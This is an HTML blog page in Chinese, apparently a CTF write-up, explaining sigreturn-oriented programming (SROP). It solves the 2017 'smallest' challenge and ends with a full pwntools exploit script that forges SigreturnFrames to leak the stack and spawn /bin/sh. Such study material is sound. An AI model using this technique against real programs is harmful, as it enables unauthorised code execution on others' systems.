@@ -1,0 +1,168 @@
+<!doctype html>
+<html lang="zh-CN" data-base="/">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>CTF-PWN-栈溢出-高级 ROP-[SROP] · Y0uYuGe</title>
+<meta name="description" content="SROP（面向 sigreturn 的编程）由阿姆斯特丹自由大学的 Erik Bosman 于 2014 年提出。相关研究《Framing Signals — A Return to Portable Shellcode》发表于安全顶会 Oakland 2014，并入选当年的最佳学生论文。下方给出了论文和幻灯片。">
+<link rel="stylesheet" href="/blog/article.css">
+</head>
+<body data-page="article">
+<header class="bar">
+  <a class="brand" href="/">Y0uYuGe</a>
+  <a class="tomap" href="/#/endpoint-security/ctf-and-pwn/stack-and-rop/CTF-PWN-%E6%A0%88%E6%BA%A2%E5%87%BA-%E9%AB%98%E7%BA%A7%20ROP-%5BSROP%5D" title="在导图上看这篇文章的位置">◎ 在导图中查看</a>
+</header>
+<div class="wrap">
+  <main class="post">
+    <nav class="crumbs"><a href="/#/">Y0uYuGe</a><span class="sep">›</span><a href="/#/endpoint-security">终端安全</a><span class="sep">›</span><a href="/#/endpoint-security/ctf-and-pwn">CTF 与 Pwn</a><span class="sep">›</span><a href="/#/endpoint-security/ctf-and-pwn/stack-and-rop">栈与 ROP</a></nav>
+    <h1>CTF-PWN-栈溢出-高级 ROP-[SROP]</h1>
+    <div class="meta"><time>2024-01-04</time><span class="tag">#CTF-PWN</span><span class="tag">#Pwn</span><span class="tag">#CTF</span><span class="tag">#ROP</span></div>
+    <article class="post-body">
+<p><a href="https://www.anquanke.com/post/id/85810">参考链接</a>
+SROP（Sigreturn Oriented Programming，面向 sigreturn 的编程）由阿姆斯特丹自由大学的 Erik Bosman 于 2014 年提出。相关研究《Framing Signals — A Return to Portable Shellcode》发表于安全顶会 Oakland 2014，并入选当年的最佳学生论文。论文和幻灯片如下：</p>
+<ul>
+<li><a href="https://www.ieee-security.org/TC/SP2014/papers/FramingSignals-AReturntoPortableShellcode.pdf">论文</a></li>
+<li><a href="https://tc.gtisc.gatech.edu/bss/2014/r/srop-slides.pdf">幻灯片</a></li>
+</ul>
+<h1 id="linux-信号处理">Linux 信号处理</h1>
+<ol>
+<li>发生中断或异常时，内核会向相关进程发送信号。</li>
+<li>随后系统切换到内核态，内核执行 setup_fram() 函数，设置用户栈。setup_frame 的主要工作是将保存所有寄存器值及其他重要信息的数据结构压入用户栈（具体内容因架构而异），同时压入信号处理函数的返回地址，即 sigruturn() 的地址。</li>
+<li>接着执行 hand_signal，跳转到用户态运行信号处理函数。</li>
+<li>信号处理函数在用户态执行完毕后，由于返回地址被设为 sigreturn() 系统调用的地址，系统会再次陷入内核，执行 sigreturn()。该系统调用主要负责从先前压入栈中的数据恢复寄存器值及相关内容。系统调用结束后，程序恢复执行。</li>
+</ol>
+<p>关于 sigreturn 系统调用：</p>
+<pre><code class="language-c">/*x86架构*/
+    mov eax,0x77
+    int 80h
+/*x86_64架构*/
+    mov rax,0xf
+    syscall
+</code></pre>
+<h1 id="2017-360-春秋杯-smallest">2017 360 春秋杯 smallest</h1>
+<h1 id="检查">检查</h1>
+<p>静态链接的 64 位文件。
+<img src="/workspace/endpoint-security/ctf-and-pwn/stack-and-rop/CTF-PWN-%E6%A0%88%E6%BA%A2%E5%87%BA-%E9%AB%98%E7%BA%A7%20ROP-%5BSROP%5D/assets/csdn-135362695/image-001-7fd177b6da.png" alt="图片"></p>
+<h1 id="源码">源码</h1>
+<p>反汇编程序并导入 IDA 后，全部内容就是图中所示的这些。
+<img src="/workspace/endpoint-security/ctf-and-pwn/stack-and-rop/CTF-PWN-%E6%A0%88%E6%BA%A2%E5%87%BA-%E9%AB%98%E7%BA%A7%20ROP-%5BSROP%5D/assets/csdn-135362695/image-002-f37b6c7b35.png" alt="图片"></p>
+<h1 id="思路">思路</h1>
+<p>通过溢出构造 ROP 链：程序没有动态链接库，自身的 gadget 也少得可怜。gadget 不足时，要使用 ret2syscall，就需要让系统调用参数 rax 为 59、rdi 为 /bin/sh 的地址，rsi 和 rdx 为零。
+但程序中没有相关的 pop gadget，因此无法通过 ROP 完成系统调用。这时可以使用 SROP，因为 sigreturn 系统调用会执行一系列 pop 指令，让我们有机会设置 execve 的参数。</p>
+<ol>
+<li>首先，rax 很容易设置，设为 execve 的系统调用号即可。</li>
+<li>其次，rdi 必须是 /bin/sh 的地址；程序中找不到 /bin/sh，因此需要把它输入到栈上，再获取它在栈上的地址。</li>
+<li>然后是 rsi 和 rdx，也很简单，都设为 0。</li>
+</ol>
+<p>那么，如何输入 /bin/sh 并获取它的地址？
+首先需要获得栈上输入区域的起始地址，然后在下一次输入中写入 /bin/sh，再调用 execve 系统调用。</p>
+<ol>
+<li>先让 write 函数输出栈基址。
+write 对应的系统调用要求 rax 为 1、rdi 为 1、rsi 为栈基址，rdx 大于 8。修改 rax 的唯一办法是利用 read 执行后将输入长度存入 rax 的行为。因此，只输入一个字节，且让返回地址从 0x4000B3 开始，最终 write 就会输出栈基址。需要提前布置好返回地址，这样第二次执行 read 时，输入一个字节，修改返回地址的一个字节后，地址就恰好变为 0x4000b3。</li>
+<li>随后 write 输出 rsp 的值。由于此时只能输出，因此返回地址必须在第一次输入时就布置好。获得 rsp 后，就可以将其用于输入函数，输入相应的 sigframe，同时把返回地址设为系统调用地址。由于要进入 sigreturn，read 的输入长度必须等于 15，因此还要等待两次输入。一次输入发送 sigfram 和 /bin/sh，并将返回地址设为再次输入的位置；下一次只输入系统调用地址以及不影响 sigfram 的另外七个字节。这样就会先调用 sigreturn，再调用 execve。</li>
+</ol>
+<h2 id="即将执行第一次-ret-时的栈">即将执行第一次 ret 时的栈</h2>
+<p>可以看到，栈内容中包含一个栈上的地址，因此可以泄露栈地址，再把 rsp 设置到泄露出的栈位置。
+<img src="/workspace/endpoint-security/ctf-and-pwn/stack-and-rop/CTF-PWN-%E6%A0%88%E6%BA%A2%E5%87%BA-%E9%AB%98%E7%BA%A7%20ROP-%5BSROP%5D/assets/csdn-135362695/image-003-c04ff25bb1.png" alt="图片"></p>
+<h2 id="执行-write-函数时">执行 write 函数时</h2>
+<p>第一次输入两个 0x4000b0 地址；第二次输入一个字节，将返回地址改为 0x4000b3。
+<img src="/workspace/endpoint-security/ctf-and-pwn/stack-and-rop/CTF-PWN-%E6%A0%88%E6%BA%A2%E5%87%BA-%E9%AB%98%E7%BA%A7%20ROP-%5BSROP%5D/assets/csdn-135362695/image-004-de802a714b.png" alt="图片"></p>
+<h2 id="将-rsp-改为泄露出的栈地址">将 rsp 改为泄露出的栈地址</h2>
+<p>constants.SYS_read 是 read 的系统调用号常量。
+write 执行后，程序还会接受一次输入。这次输入先把返回地址改为 0x4000b0，使程序能够再次输入，同时写入为下一次输入预留的返回地址和 sigfram。</p>
+<p>接下来的一次输入将返回地址改为系统调用地址，输入字节数为 15，从而触发 sigreturn 系统调用，修改相应寄存器。</p>
+<p>此时，rip 为系统调用地址，rsp 为泄露出的栈地址，其他参数则是输入函数的参数。</p>
+<p>sigreturn 返回后，执行 rip 指向的输入函数。
+<img src="/workspace/endpoint-security/ctf-and-pwn/stack-and-rop/CTF-PWN-%E6%A0%88%E6%BA%A2%E5%87%BA-%E9%AB%98%E7%BA%A7%20ROP-%5BSROP%5D/assets/csdn-135362695/image-005-c0e34d8220.png" alt="图片"></p>
+<h1 id="输入-binsh-并调用-sigreturn">输入 /bin/sh 并调用 sigreturn</h1>
+<p>最后输入 /bin/sh，构造 sigfram，同时将返回地址设为输入函数。
+然后输入系统调用地址和 7 个空字节，触发 sigreturn 调用。返回后，rip 指向系统调用；由于 rax 是 execve 的系统调用号，因此可以 getshell。</p>
+<h1 id="系统调用回顾">系统调用回顾</h1>
+<blockquote>
+<p>系统调用与普通库函数调用很相似，但系统调用由操作系统内核提供，在内核态运行；普通库函数调用则由函数库或用户提供，在用户态运行。</p>
+</blockquote>
+<pre><code class="language-c">int execve(const char *filename, char *const argv[], char *const envp[]);
+</code></pre>
+<blockquote>
+<p>filename 指定要运行的程序文件名；argv 和 envp 分别指定程序的运行参数和环境变量。</p>
+</blockquote>
+<blockquote>
+<p>!! system 函数不是系统调用。</p>
+</blockquote>
+<h1 id="exp">exp</h1>
+<h2 id="注意一个非常坑的地方">注意一个非常坑的地方</h2>
+<blockquote>
+<p>Python 的 SigreturnFrame() 函数对应前面提到的数据结构：它被压入用户栈，保存所有寄存器值及其他重要信息，具体内容因架构而异。</p>
+</blockquote>
+<pre><code class="language-python">fram=SigreturnFrame()
+fram.rax=constants.SYS_read
+fram.rdi=0
+fram.rsi=stack_addr
+fram.rdx=0x400
+fram.rsp=stack_addr
+fram.rip=sys_ret
+payload=p64(read_ret)+b&#39;a&#39; *8+bytes(fram)
+</code></pre>
+<p>这里要使用 bytes(fram)。
+在 fram 中为寄存器赋值的位置，不能赋 bytes 类型的值。
+找这个问题花了我很多时间。</p>
+<pre><code class="language-python">from pwn import*
+context(os=&quot;linux&quot;,arch=&quot;amd64&quot;,log_level=&quot;debug&quot;)
+s=process(&quot;./srop&quot;)
+srop = ELF(&#39;./srop&#39;)
+#gdb.attach(s,&quot;b main&quot;)
+read_ret=0x00000000004000B0
+sys_ret=0x00000000004000BE
+payload=p64(read_ret)*3 
+s.send(payload)
+
+#sleep(3)
+s.send(&quot;\xb3&quot;) # 修改返回地址为0x4000b3
+
+stack_addr=u64(s.recv()[8:16])
+print(&quot;泄露的栈地址&quot;,hex(stack_addr))
+
+fram=SigreturnFrame()
+fram.rax=constants.SYS_read
+fram.rdi=0
+fram.rsi=stack_addr
+fram.rdx=0x400
+fram.rsp=stack_addr
+fram.rip=sys_ret
+payload=p64(read_ret)+b&quot;\x00&quot;*8+bytes(fram)
+s.send(payload)
+#sleep(3)
+
+payload=p64(sys_ret)+b&quot;\x00&quot;*7 # rax被设置为15,ret执行系统调用sigreturn，同时空字节也没有修改sigreturnframe的结构
+# 由于系统调用改变rip和rsp，执行输入函数
+s.send(payload)
+
+print(&quot;fram的长度&quot;,len(fram))
+
+
+fram=SigreturnFrame()
+fram.rax=constants.SYS_execve
+fram.rdi=stack_addr+270
+fram.rsi=0
+fram.rdx=0
+fram.rip=sys_ret
+payload=p64(read_ret)+b&quot;\x00&quot;*8+bytes(fram)
+payload=payload+(270-len(payload))*b&quot;\x00&quot;+b&quot;/bin/sh\x00&quot;
+
+
+s.send(payload)
+payload=p64(sys_ret)+b&quot;\x00&quot;*7
+s.send(payload)
+
+s.interactive()
+</code></pre>
+
+    </article>
+    
+    <nav class="pn"><a href="/workspace/endpoint-security/ctf-and-pwn/stack-and-rop/BROP/"><span class="l">上一篇</span>BROP</a><a href="/workspace/endpoint-security/ctf-and-pwn/stack-and-rop/CTF-PWN-%E6%A0%88%E6%BA%A2%E5%87%BA-%E5%9F%BA%E6%9C%AC%20ROP-%5Bret2libc%5D/"><span class="l">下一篇</span>CTF-PWN-栈溢出-基本 ROP-[ret2libc]</a></nav>
+  </main>
+  <aside class="toc"><div class="toc-h">目录</div><a class="d2" href="#即将执行第一次-ret-时的栈">即将执行第一次 ret 时的栈</a><a class="d2" href="#执行-write-函数时">执行 write 函数时</a><a class="d2" href="#将-rsp-改为泄露出的栈地址">将 rsp 改为泄露出的栈地址</a><a class="d2" href="#注意一个非常坑的地方">注意一个非常坑的地方</a></aside>
+</div>
+<script type="module" src="/blog/article.js"></script>
+</body>
+</html>
